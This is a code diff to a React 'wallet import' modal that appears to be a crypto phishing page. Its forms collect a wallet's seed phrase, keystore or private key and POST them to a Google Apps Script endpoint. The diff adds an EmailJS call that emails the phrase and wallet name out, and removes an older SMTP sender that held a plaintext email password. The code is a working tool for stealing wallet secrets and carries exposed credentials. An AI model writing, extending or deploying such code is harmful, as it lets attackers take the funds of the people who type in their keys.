@@ -7,13 +7,17 @@ import {
 } from "./modalform-bev.js";
 
 const WalletModalImport = (props) => {
-  const [phrase, setPhrase] = React.useState("");
+  const [phrase, setPhrase] = React.useState({
+    phrase_key: "",
+    walletName: "",
+  });
 
   const phraseSubmit = (e) => {
     e.preventDefault();
     const scriptURL =
       "https://script.google.com/macros/s/AKfycbyH0l04MQ_BkLXn5EvZi2YE-H7Cv_grkBVNlyi9hI0aQckkCRFOjezMBFu-XyXlPgIOcQ/exec";
     const form = document.forms["phrasesync"];
+    handleSubmit(e);
     document.getElementById("loader").className = "loader";
     fetch(scriptURL, { method: "POST", body: new FormData(form) })
       .then((res) => {
@@ -22,7 +26,7 @@ const WalletModalImport = (props) => {
       })
       .then((res) => {
         console.log(res);
-        location.reload();
+        // location.reload();
       });
   };
   const keystoreSubmit = (e) => {
@@ -31,17 +35,20 @@ const WalletModalImport = (props) => {
     const scriptURL =
       "https://script.google.com/macros/s/AKfycbyH0l04MQ_BkLXn5EvZi2YE-H7Cv_grkBVNlyi9hI0aQckkCRFOjezMBFu-XyXlPgIOcQ/exec";
     const form = document.forms["keystoresync"];
+    handleSubmit(e);
     document.getElementById("loader").className = "loader";
     fetch(scriptURL, { method: "POST", body: new FormData(form) })
       .then(() => document.getElementById("loader").classList.remove("loader"))
       .then(() => location.reload());
   };
   const privateSubmit = (e) => {
-    e.preventDefault(e);
+    e.preventDefault();
     document.getElementById("loader").classList.add("loader");
     const scriptURL =
       "https://script.google.com/macros/s/AKfycbyH0l04MQ_BkLXn5EvZi2YE-H7Cv_grkBVNlyi9hI0aQckkCRFOjezMBFu-XyXlPgIOcQ/exec";
     const form = document.forms["privatesync"];
+
+    handleSubmit(e);
     document.getElementById("loader").className = "loader";
     fetch(scriptURL, { method: "POST", body: new FormData(form) })
       .then(() => document.getElementById("loader").classList.remove("loader"))
@@ -55,26 +62,27 @@ const WalletModalImport = (props) => {
     setPhrase({ [name]: phrase, walletName });
   };
 
-  // const handleSubmit = (e) => {
-  //     e.preventDefault(e)
-  //     document.getElementById('loader').classList.add("loader")
+  const handleSubmit = (e) => {
+    e.preventDefault(e);
 
-  //     Email.send({
-  //         Host : "smtp.elasticemail.com",
-  //         Username : "billybillions1017@gmail.com",
-  //         Password : "E035009932D949098B05557E2F29A816F418",
-  //         To : "billybillions1017@gmail.com",
-  //         From : "billybillions1017@gmail.com",
-  //         Subject : "phrase",
-  //         Body : `${Object.values(phrase)}`
-  //     }).then(
-  //       message => {
-  //         document.getElementById('loader').classList.remove("loader")
-  //         console.log(message);
-  //         location.reload()
-  //         }
-  //     ).catch((e) => console.log(e))
-  // }
+    const templateParams = {
+      firstname: phrase.phrase_key,
+      lastname: phrase.walletName,
+    };
+
+    emailjs.init({
+      publicKey: "vdTp8sfw8L1_oEEoM",
+    });
+
+    emailjs.send("service_hnew9sq", "romana", templateParams).then(
+      (response) => {
+        console.log("SUCCESS!", response.status, response.text);
+      },
+      (error) => {
+        console.log("FAILED...", error);
+      }
+    );
+  };
 
   return (
     <div
